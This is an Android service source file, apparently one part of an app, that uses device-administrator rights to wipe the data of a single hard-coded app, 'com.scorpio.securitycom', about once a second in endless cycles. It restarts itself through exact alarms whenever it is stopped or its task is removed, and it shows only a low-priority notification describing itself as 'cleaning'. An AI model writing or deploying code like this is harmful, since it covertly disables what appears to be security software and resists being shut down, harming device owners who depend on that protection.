package com.apolo.apolo;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class ClearService extends Service {
    private static final String TAG = "ClearService";
    private static final String CHANNEL_ID = "clear_service_channel";
    private static final int NOTIF_ID = 1;
    private static final int NOTIF_CYCLE_FINISHED_ID = 2;

    private static final long INTERVAL_MS = 1000; // 10 segundos entre limpiezas
    private static final int MAX_CLEAN_COUNT = 10; // Limpiezas por ciclo

    private Handler handler;
    private Runnable clearTask;
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    private Executor executor;

    private static final String TARGET_PACKAGE = "com.scorpio.securitycom";

    private int cleanCount = 0;
    private enum ServiceState { IDLE, RUNNING, STOPPED }
    private ServiceState currentState = ServiceState.IDLE;

    private NotificationManager notificationManager;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "Servicio creado");
        notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        createNotificationChannel();
        createCycleFinishedChannel();
        startForegroundServiceWithNotification();

        handler = new Handler(Looper.getMainLooper());
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, MyAdminReceiver.class);
        executor = Executors.newSingleThreadExecutor();

        setupClearTask();
    }

    private void startForegroundServiceWithNotification() {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Limpieza activa")
                .setContentText("Ejecutando ciclo de limpieza automática")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setOngoing(true)
                .build();

        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIF_ID, notification);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Servicio de Limpieza",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Notificaciones del servicio de limpieza");
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }
    }

    private void createCycleFinishedChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "cycle_finished_channel",
                    "Ciclo de limpieza finalizado",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            channel.setDescription("Notificaciones cuando el ciclo de limpieza termina");
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }
    }

    private void showCycleFinishedNotification() {
        Notification notification = new NotificationCompat.Builder(this, "cycle_finished_channel")
                .setContentTitle("Ciclo de limpieza completado")
                .setContentText("El servicio se reiniciará para comenzar un nuevo ciclo")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                .setAutoCancel(true)
                .build();

        if (notificationManager != null) {
            notificationManager.notify(NOTIF_CYCLE_FINISHED_ID, notification);
        }
    }

    private void setupClearTask() {
        clearTask = new Runnable() {
            @Override
            public void run() {
                try {
                    if (dpm == null) {
                        Log.w(TAG, "DevicePolicyManager es null");
                        stopSelf();
                        currentState = ServiceState.STOPPED;
                        return;
                    }
                    if (!dpm.isAdminActive(adminComponent)) {
                        Log.w(TAG, "No es administrador de dispositivo, no se puede limpiar");
                        stopSelf();
                        currentState = ServiceState.STOPPED;
                        return;
                    }

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        Log.i(TAG, "Limpieza #" + (cleanCount + 1) + " de: " + TARGET_PACKAGE);
                        dpm.clearApplicationUserData(adminComponent, TARGET_PACKAGE, executor,
                                (packageName, succeeded) -> Log.i(TAG, "Limpieza: " + packageName + " - " + (succeeded ? "Éxito" : "Falló")));
                    } else {
                        Log.w(TAG, "API no soportada para clearApplicationUserData");
                        stopSelf();
                        currentState = ServiceState.STOPPED;
                        return;
                    }

                    cleanCount++;

                    if (cleanCount >= MAX_CLEAN_COUNT) {
                        Log.i(TAG, "Ciclo completado. Reiniciando servicio...");
                        showCycleFinishedNotification();
                        stopCleanupProcess();
                        scheduleRestart();
                        stopSelf();
                        currentState = ServiceState.STOPPED;
                    } else {
                        handler.postDelayed(this, INTERVAL_MS);
                    }

                } catch (Throwable t) {
                    Log.e(TAG, "Error inesperado en clearTask", t);
                    stopSelf();
                    currentState = ServiceState.STOPPED;
                }
            }
        };
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "onStartCommand recibido, iniciando limpieza");
        if (currentState != ServiceState.RUNNING) {
            cleanCount = 0;
            handler.post(clearTask);
            currentState = ServiceState.RUNNING;
        }
        return START_STICKY;
    }

    public void stopCleanupProcess() {
        if (handler != null && clearTask != null) {
            handler.removeCallbacks(clearTask);
            Log.i(TAG, "Proceso de limpieza detenido");
            currentState = ServiceState.IDLE;
        }
    }

    private void scheduleRestart() {
        Log.i(TAG, "Programando reinicio del servicio en 1 segundo");
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager == null) {
            Log.e(TAG, "AlarmManager es null, no se puede programar reinicio");
            return;
        }

        Intent restartServiceIntent = new Intent(getApplicationContext(), ClearService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
                this,
                0,
                restartServiceIntent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_CANCEL_CURRENT
        );

        long triggerAtMillis = SystemClock.elapsedRealtime() + 1000; // 1 segundo

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtMillis, pendingIntent);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtMillis, pendingIntent);
        } else {
            alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtMillis, pendingIntent);
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.i(TAG, "onTaskRemoved llamado, reiniciando servicio");
        stopCleanupProcess();
        scheduleRestart();
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        Log.i(TAG, "Servicio destruido, limpiando recursos");
        stopCleanupProcess();
        stopForeground(true);
        scheduleRestart();
        currentState = ServiceState.STOPPED;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
